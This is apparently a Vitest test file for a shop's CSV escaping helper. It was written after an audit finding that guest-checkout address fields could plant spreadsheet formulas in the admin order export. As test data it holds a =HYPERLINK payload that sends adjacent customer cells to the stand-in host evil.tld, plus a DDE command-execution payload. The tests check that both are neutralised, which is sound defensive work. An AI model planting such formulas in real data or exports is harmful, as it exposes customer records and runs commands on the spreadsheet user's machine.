import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { escapeCsvCell, toCsv } from "@/lib/csv";

// G17 / F4 (MEDIUM, 3/3 panel): the admin order export quoted CSV cells but
// never neutralised a leading =, +, - or @, while the sibling newsletter export
// did. Shipping-address fields come straight from the UNAUTHENTICATED guest
// checkout body, so any customer could plant a formula that fires in the shop
// owner's spreadsheet — =HYPERLINK/WEBSERVICE exfiltration of the surrounding
// customer rows, or DDE command execution on Windows.

describe("escapeCsvCell (G17 F4)", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralises a leading %j so the cell cannot be read as a formula",
    (lead) => {
      const out = escapeCsvCell(`${lead}HYPERLINK("https://evil.tld")`);
      expect(out.startsWith(`"'${lead}`)).toBe(true);
    }
  );

  it("neutralises the exact payload from the finding", () => {
    const payload = '=HYPERLINK("https://evil.tld/?d="&A2&B2,"Click to view invoice")';
    const out = escapeCsvCell(payload);
    // The formula character is no longer the first character of the cell value.
    expect(out).toBe(`"'=HYPERLINK(""https://evil.tld/?d=""&A2&B2,""Click to view invoice"")"`);
  });

  it("neutralises the DDE payload shape too", () => {
    expect(escapeCsvCell("=cmd|'/c calc'!A0")).toBe(`"'=cmd|'/c calc'!A0"`);
  });

  it("doubles embedded quotes and always wraps, so delimiters cannot break out", () => {
    expect(escapeCsvCell('a"b')).toBe('"a""b"');
    expect(escapeCsvCell("a,b")).toBe('"a,b"');
    expect(escapeCsvCell("a\nb")).toBe('"a\nb"');
  });

  it("leaves ordinary values readable", () => {
    expect(escapeCsvCell("Олександр Петренко")).toBe('"Олександр Петренко"');
    expect(escapeCsvCell("")).toBe('""');
  });

  it("coerces non-strings rather than throwing", () => {
    expect(escapeCsvCell(42)).toBe('"42"');
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
  });
});

describe("toCsv (G17 F4)", () => {
  it("escapes every cell including the header row", () => {
    expect(
      toCsv([
        ["Name", "Total"],
        ["=cmd", 5],
      ])
    ).toBe('"Name","Total"\n"\'=cmd","5"');
  });
});

describe("no export route rolls its own escaper (G17 F4)", () => {
  // The bug was a second, weaker copy of an escaper that already existed.
  // A local re-implementation in an export route is the shape to prevent.
  const ROUTES = [
    "src/app/api/admin/orders/export/route.ts",
    "src/app/api/admin/newsletter/export/route.ts",
  ];

  it.each(ROUTES)("%s uses the shared escaper", (route) => {
    const source = readFileSync(join(__dirname, "..", "..", route), "utf8");
    expect(source).toMatch(/from "@\/lib\/csv"/);
    expect(source).not.toMatch(/(const|function)\s+escapeCS?V?\w*\s*[=(]/i);
  });
});
